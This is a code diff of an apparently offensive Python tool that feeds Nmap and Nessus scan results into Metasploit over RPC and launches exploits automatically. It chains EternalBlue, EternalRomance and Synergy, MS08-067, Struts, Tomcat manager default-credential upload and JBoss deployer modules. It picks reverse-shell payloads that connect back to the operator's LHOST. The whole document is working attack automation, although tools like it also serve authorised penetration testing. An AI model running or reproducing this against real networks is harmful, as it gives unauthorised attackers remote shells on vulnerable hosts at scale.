@@ -228,20 +228,17 @@ def get_hosts(report, nse):
 
     return hosts
 
-def check_named_pipes(c_id, ip, nmap_os):
+def check_named_pipes(c_id, ip, os_type):
     '''
     If we can avoid EternalBlue we will because EternalRomance/Synergy
     works on more versions of Windows
     If we can get a named pipe then we'll use Romance/Synergy over Blue
     '''
     pipes = None
-    path = 'auxiliary/scanner/smb/pipe_auditor'
-    rhost_var = get_rhost_var(c_id, path)
-    port = '445'
-    opts = ''
-    payload = get_payload(path, nmap_os)
-    cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
-    mod_out = run_console_cmd(c_id, cmd)
+    mod = 'auxiliary/scanner/smb/pipe_auditor'
+    extra_opts = ''
+    check = False
+    mod_out = run_msf_module(c_id, ip, mod, port, extra_opts, check, os_type)
 
     # Example output:
     '''
@@ -261,19 +258,19 @@ def check_named_pipes(c_id, ip, nmap_os):
 def create_msf_cmd(module_path, rhost_var, ip, port, payload, extra_opts):
     '''
     You can set arbitrary options that don't get used which is why we autoinclude
-    ExitOnSession True; even if we use aux module this just won't do anything
+    ExitOnSession True and SRVHOST (for JBoss); even if we use aux module this just won't do anything
     '''
     local_ip = get_local_ip(get_iface())
     print_info('Setting options on {}'.format(module_path))
     cmds = """
-           use {}\n
            set {} {}\n
            set RPORT {}\n
            set LHOST {}\n
+           set SRVHOST {}\n
            set payload {}\n
-           {}\n
            set ExitOnSession True\n
-           """.format(module_path, rhost_var, ip, port, local_ip, payload, extra_opts)
+           {}\n
+           """.format(rhost_var, ip, port, local_ip, local_ip, payload, extra_opts)
 
     return cmds
 
@@ -304,18 +301,12 @@ def get_req_opts(c_id, module):
                     req_opts.append(opt_name.decode('utf8'))
     return req_opts
 
-def get_rhost_var(c_id, module):
-    req_opts = get_req_opts(c_id, module)
+def get_rhost_var(c_id, req_opts):
     for o in req_opts:
-        # Just handle the one req opt I can find that we might use that's not RHOST(S)
         if 'RHOST' in o:
             return o
-    print_bad('Could not get RHOST var')
-    print_bad('List of required options:')
-    for o in req_opts:
-        print_info(o)
 
-def get_payload(module, operating_sys):
+def get_payload(module, operating_sys, target_num):
     '''
     Automatically get compatible payloads
     '''
@@ -326,12 +317,14 @@ def get_payload(module, operating_sys):
                     'java/meterpreter/reverse_https',
                     'java/jsp_shell_reverse_tcp']
 
-    unix_payloads = ['java/meterpreter/reverse_https',
-                     'java/jsp_shell_reverse_tcp',
-                     'cmd/unix/reverse']
-
-    
-    payloads_dict = CLIENT.call('module.compatible_payloads', [module])
+    linux_payloads = ['generic/shell_reverse_tcp',
+                      'java/meterpreter/reverse_https',
+                      'java/jsp_shell_reverse_tcp',
+                      'cmd/unix/reverse']
+    if target_num:
+        payloads_dict = CLIENT.call('module.target_compatible_payloads', [module, int(target_num)])
+    else:
+        payloads_dict = CLIENT.call('module.compatible_payloads', [module])
 
     if b'error' in payloads_dict:
         if 'auxiliary' not in module:
@@ -349,8 +342,8 @@ def get_payload(module, operating_sys):
         for p in win_payloads:
             if p in payloads:
                 payload = p
-    elif 'nix' in operating_sys.lower():
-        for p in win_payloads:
+    elif 'linux' in operating_sys.lower():
+        for p in linux_payloads:
             if p in payloads:
                 payload = p
 
@@ -374,7 +367,9 @@ def check_vuln(c_id):
     # Cannot reliably check exploitability
     cmd = 'check\n'
     out = run_console_cmd(c_id, cmd)
-    not_sure_msgs = ['Cannot reliably check exploitability', 'The state could not be determined']
+    not_sure_msgs = ['Cannot reliably check exploitability', 
+                     'The state could not be determined',
+                     'This module does not support check']
     if out == []:
         print_info('Unsure if vulnerable, continuing with exploit')
         return True
@@ -401,21 +396,21 @@ def run_nessus_exploits(c_id, exploits):
         for mod in all_mods:
             if mod[b'name'].decode('utf8') == mod_desc:
                 path = mod[b'fullname'].decode('utf8')
+
+                # Prevent auxiliary and post modules, all DOS modules are auxiliary
+                if not path.startswith('exploit/'):
+                    path = None
+                    break
                 print_info('Using module {}'.format(path))
+
         if not path:
             print_bad('Error finding module with description: {}'.format(mod_desc))
             continue
 
-        for operating_sys, ip, port in exploits[mod_desc]:
-            payload = get_payload(path, operating_sys)
-            if not payload:
-                continue
-            rhost_var = get_rhost_var(c_id, path)
-            opts = ''
-            cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
-            settings_out = run_console_cmd(c_id, cmd)
-            print_info('Checking if host is vulnerable...')
-            output = run_if_vuln(c_id, cmd)
+        for os_type, ip, port in exploits[mod_desc]:
+            extra_opts = ''
+            check = True
+            mod_out = run_msf_module(c_id, ip, path, port, extra_opts, check, os_type)
 
 def get_nse_scripts(hosts):
     nse_scripts = {}
@@ -426,7 +421,7 @@ def get_nse_scripts(hosts):
         if 'windows' in nmap_os.lower():
             os_type = 'windows'
         else:
-            os_type = 'nix'
+            os_type = 'linux'
 
         for s in host.services:
             if s.open():
@@ -443,12 +438,12 @@ def get_nse_scripts(hosts):
                         nse_scripts[ip] = {port:smb_scripts}
 
                 # Run HTTP scripts
-                elif 'http' in s.service:
-                    http_scripts = ['http-title']
-                    if ip in nse_scripts:
-                        nse_scripts[ip][port] = http_scripts
-                    else:
-                        nse_scripts[ip] = {port:http_scripts}
+                #elif 'http' in s.service:
+                #    http_scripts = ['http-title']
+                #    if ip in nse_scripts:
+                #        nse_scripts[ip][port] = http_scripts
+                #    else:
+                #        nse_scripts[ip] = {port:http_scripts}
 
     return nse_scripts
 
@@ -490,15 +485,19 @@ def run_nmap_exploits(c_id, hosts, nse_hosts):
 
 def check_host_scripts(c_id, host):
     # Check for host script results
-    ms08_vuln = check_nse_host_scripts(nse_host, 'smb-vuln-ms08-067')
+    ip = host.address
+    os_type = get_nmap_os(host)
+
+    ms08_vuln = check_nse_host_scripts(host, 'smb-vuln-ms08-067')
     if ms08_vuln:
+        check = True
         mod = 'exploit/windows/smb/ms08_067_netapi'
         port = '445'
-        mod_out = run_msf_module(c_id, nse_host, mod, port, '')
+        mod_out = run_msf_module(c_id, ip, mod, port, '', check, os_type)
 
-    ms17_vuln = check_nse_host_scripts(nse_host, 'smb-vuln-ms17-010')
+    ms17_vuln = check_nse_host_scripts(host, 'smb-vuln-ms17-010')
     if ms17_vuln:
-        mod_out = run_ms17(c_id, nse_host)
+        mod_out = run_ms17(c_id, ip, os_type)
 
 def check_nse_host_scripts(host, script):
     '''
@@ -516,22 +515,20 @@ def check_nse_host_scripts(host, script):
     return False
 
 def check_service_scripts(c_id, host):
-    for s in nse_host.services:
+    for s in host.services:
         if s.open():
             port = str(s.port)
-            for script in s.scripts_results:
-                if script['id'] == 'http-title':
-                    script_out = script['output']
-                    tomcat_vuln = is_tomcat_jsp_upload_vuln(script_out)
-                    if tomcat_vuln:
-                        mod = 'expoit/multi/http/tomcat_mgr_deploy'
-                        mod_out = run_msf_module(c_id, nse_host, mod, port, '')
+            #for script in s.scripts_results:
+            #    if script['id'] == 'http-title':
+            #        script_out = script['output']
 
 def check_nmap_services(c_id, host):
     '''
     Checks Nmap service banners for potential vulnerabilities
     '''
     mods = []
+    ip = host.address
+    os_type = get_nmap_os(host)
 
     for s in host.services:
         if s.open():
@@ -539,57 +536,130 @@ def check_nmap_services(c_id, host):
 
             if 'Apache Tomcat/Coyote JSP engine' in s.banner:
 
+                # JBoss - jboss_mods may return empty list
+                jboss_mods = check_for_jboss_vulns(c_id, port, ip, os_type)
+                mods += jboss_mods
+
                 # Struts DMI REST exec
                 # Can Struts be run without Tomcat? Maybe, but seems really rare
-                struts_mod = 'exploit/multi/http/struts_dmi_rest_exec'
-                exploit_paths.append(struts_mod)
-
-                # Tomcat manager upload with default creds
-                tomcat_mgr_mod = 'exploit/multi/http/tomcat_mgr_upload'
+                struts_mod = ('exploit/multi/http/struts_dmi_rest_exec', port)
                 mods.append(struts_mod)
 
-                # JBoss
-                jboss_mods = check_for_jboss_vulns(port, host)
-                if jboss_mods:
-                    mods += jboss_mods
+                # Tomcat manager upload with default creds
+                tomcat_mgr_mod = ('exploit/multi/http/tomcat_mgr_upload', port)
+                mods.append(tomcat_mgr_mod)
 
-    for mod in mods:
-        mod_out = run_msf_module(c_id, host, mod, port, '')
+    if len(mods) > 0:
+        for m in mods:
+            check = True
+            mod = m[0]
+            port = m[1]
+            mod_out = run_msf_module(c_id, ip, mod, port, '', check, os_type)
+            check_for_retry(c_id, mod_out)
 
-def check_for_jboss_vulns(port, host):
+def check_for_retry(c_id, mod_out):
     '''
-    Checks if page is runing vulnerable JBoss
+    Sometimes some modules retry after failing but the console won't
+    say it's busy while the module sleeps for X seconds which means
+    the script will continue but the sleepy module's handler will interfere
+    with further exploits
     '''
-    ####11111
-    jboss_mods = None
+    sleep_time = None
+    for l in mod_out:
+        re_sleep_time = re.search('retrying in (\d) seconds', l)
+        if re_sleep_time:
+            sleep_time = int(re_sleep_time.group(1))+2
+            break
+
+    if sleep_time:
+        time.sleep(sleep_time)
+        new_out = print_cur_output(c_id)
+        check_for_retry(c_id, new_out)
+
+def check_for_jboss_vulns(c_id, port, ip, os_type):
+    '''
+    Checks if page is running vulnerable JBoss
+    '''
+    jboss_mods = []
     jboss_vuln_scan = 'auxiliary/scanner/http/jboss_vulnscan'
-    mod_out = run_msf_module(c_id, host, mod, port, '')
+    extra_opts = ''
+    check = False
+    mod_out = run_msf_module(c_id, ip, jboss_vuln_scan, port, extra_opts, check, os_type)
+
+    jmx_console_mod = ('exploit/multi/http/jboss_maindeployer', port)
+    #jmx_console_mod2 = 'exploit/multi/http/jboss_bshdeployer'
+    for l in mod_out:
+        if '/jmx-console/HtmlAdaptor does not require authentication' in l:
+            jboss_mods.append(jmx_console_mod)
+        if '/invoker/JMXInvokerServlet does not require authentication' in l:
+            print_great('JBoss may be vulnerable to deserialization! Requires manual exploitation')
 
     return jboss_mods
 
+def set_target(c_id, mod, os_type):
+    '''
+    Sets the correct target based on OS
+    Skips auxiliary modules
+    '''
 
-def run_msf_module(c_id, host, mod, port, extra_opts):
-    ip = host.address
-    rhost_var = get_rhost_var(c_id, mod)
-    nmap_os = get_nmap_os(host)
-    payload = get_payload(mod, nmap_os)
+    # Skip aux modules
+    if 'auxiliary' in mod:
+        cmd = 'use {}\n'.format(mod)
+    else:
+        cmd = 'use {}\nshow targets\n'.format(mod)
+
+    targets = run_console_cmd(c_id, cmd)
+
+    if 'windows' in os_type.lower():
+        os_type = 'windows'
+    else:
+        os_type = 'linux'
+
+    for l in targets:
+        if 'No exploit module selected' in l:
+            return
+        re_opt_num = re.match('(\d)   ', l)
+        if re_opt_num:
+            target_num = re_opt_num.group(1)
+            if 'Windows Universal' in l and os_type == 'windows':
+                run_console_cmd(c_id, 'set target {}'.format(target_num))
+                return target_num
+            elif 'Linux Universal' in l and os_type == 'linux':
+                run_console_cmd(c_id, 'set target {}'.format(target_num))
+                return target_num
+
+def run_msf_module(c_id, ip, mod, port, extra_opts, check, os_type):
+    local_ip = get_local_ip(get_iface())
+    req_opts = get_req_opts(c_id, mod)
+
+    for o in req_opts:
+        if 'RHOST' in o:
+            rhost_var = o
+
+    target_num = set_target(c_id, mod, os_type)
+    payload = get_payload(mod, os_type, target_num)
     cmd = create_msf_cmd(mod, rhost_var, ip, port, payload, extra_opts)
     settings_out = run_console_cmd(c_id, cmd)
-    print_info('Checking if host is vulnerable...')
-    output = run_if_vuln(c_id, cmd)
 
-def run_ms17(c_id, host):
+    if check == True:
+        print_info('Checking if host is vulnerable...')
+        mod_out = run_if_vuln(c_id, cmd)
+    else:
+        exploit_cmd = 'exploit -z\n'
+        mod_out = run_console_cmd(c_id, exploit_cmd)
+
+    return mod_out
+
+def run_ms17(c_id, ip, os_type):
     '''
     Exploit ms17_010
     '''
     # Check for named pipe availability (preVista you could just grab em)
     # If we find one, then use Romance/Synergy instead of Blue
-    ip = host.address
     port = '445'
-    nmap_os = get_nmap_os(host)
     named_pipe = None
 
-    named_pipes = check_named_pipes(c_id, ip, nmap_os)
+    named_pipes = check_named_pipes(c_id, ip, os_type)
 
     # Just use the first named pipe
     if named_pipes:
@@ -602,17 +672,10 @@ def run_ms17(c_id, host):
         mod = 'exploit/windows/smb/ms17_010_eternalblue'
         extra_opts = 'set MaxExploitAttempts 6'
     
-    mod_out = run_msf_module(c_id, host, mod, port, extra_opts)
+    check = True
+    mod_out = run_msf_module(c_id, ip, mod, port, extra_opts, check, os_type)
 
     return mod_out
-
-def is_tomcat_jsp_upload_vuln(nse_out):
-    tomcat_ver_re = re.search('Tomcat/([1-9]\.[0|5]\.\d+)', nse_out)
-    if tomcat_ver_re:
-        ver = tomcat_ver_re.group(1)
-        if ver in jsp_upload_bypass_tomcat_vers():
-            return True
-    return False
 
 def run_if_vuln(c_id, cmd):
     is_vulnerable = check_vuln(c_id)
@@ -677,6 +740,8 @@ def main(report, args):
 
     # Get the latest console
     c_id = c_ids[-1].decode('utf8')
+    # Clear console output
+    CLIENT.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()
 
     if args.nessus:
         # exploits = {'msf_module_name':[(ip, port), (ip, port)]
@@ -691,48 +756,6 @@ def main(report, args):
         nse_hosts = get_hosts(nse_report, True)
         run_nmap_exploits(c_id, hosts, nse_hosts)
         remainder_output = wait_on_busy_console(c_id)
-
-def jsp_upload_bypass_tomcat_vers():
-    return ['9.0.0', '8.5.1',  '8.5.2', '8.5.3', 
-            '8.5.4', '8.5.5', '8.5.6', '8.5.7', 
-            '8.5.8', '8.5.9', '8.5.10', '8.5.11', 
-            '8.5.12', '8.5.13', '8.5.14', '8.5.15', 
-            '8.5.16', '8.5.17', '8.5.18', '8.5.19', 
-            '8.5.20', '8.5.21', '8.5.22', '8.0.0',
-            '8.0.1','8.0.2','8.0.3','8.0.4',
-            '8.0.5','8.0.6','8.0.7','8.0.8',
-            '8.0.9','8.0.10','8.0.11','8.0.12',
-            '8.0.13','8.0.14','8.0.15','8.0.16',
-            '8.0.17','8.0.18','8.0.19','8.0.20',
-            '8.0.21','8.0.22','8.0.23','8.0.24',
-            '8.0.25','8.0.26','8.0.27','8.0.28',
-            '8.0.29','8.0.30','8.0.31','8.0.32',
-            '8.0.33','8.0.34','8.0.35','8.0.36',
-            '8.0.37','8.0.38','8.0.39','8.0.40',
-            '8.0.41','8.0.42','8.0.43','8.0.44',
-            '8.0.45','8.0.46','7.0.0','7.0.1',
-            '7.0.2','7.0.3','7.0.4','7.0.5',
-            '7.0.6','7.0.7','7.0.8','7.0.9',
-            '7.0.10','7.0.11','7.0.12','7.0.13',
-            '7.0.14','7.0.15','7.0.16','7.0.17',
-            '7.0.18','7.0.19','7.0.20','7.0.21',
-            '7.0.22','7.0.23','7.0.24','7.0.25',
-            '7.0.26','7.0.27','7.0.28','7.0.29',
-            '7.0.30','7.0.31','7.0.32','7.0.33',
-            '7.0.34','7.0.35','7.0.36','7.0.37',
-            '7.0.38','7.0.39','7.0.40','7.0.41',
-            '7.0.42','7.0.43','7.0.44','7.0.45',
-            '7.0.46','7.0.47','7.0.48','7.0.49',
-            '7.0.50','7.0.51','7.0.52','7.0.53',
-            '7.0.54','7.0.55','7.0.56','7.0.57',
-            '7.0.58','7.0.59','7.0.60','7.0.61',
-            '7.0.62','7.0.63','7.0.64','7.0.65',
-            '7.0.66','7.0.67','7.0.68','7.0.69',
-            '7.0.70','7.0.71','7.0.72','7.0.73',
-            '7.0.74','7.0.75','7.0.76','7.0.77',
-            '7.0.78','7.0.79','7.0.80','7.0.81']
-
-
 
 if __name__ == "__main__":
     args = parse_args()
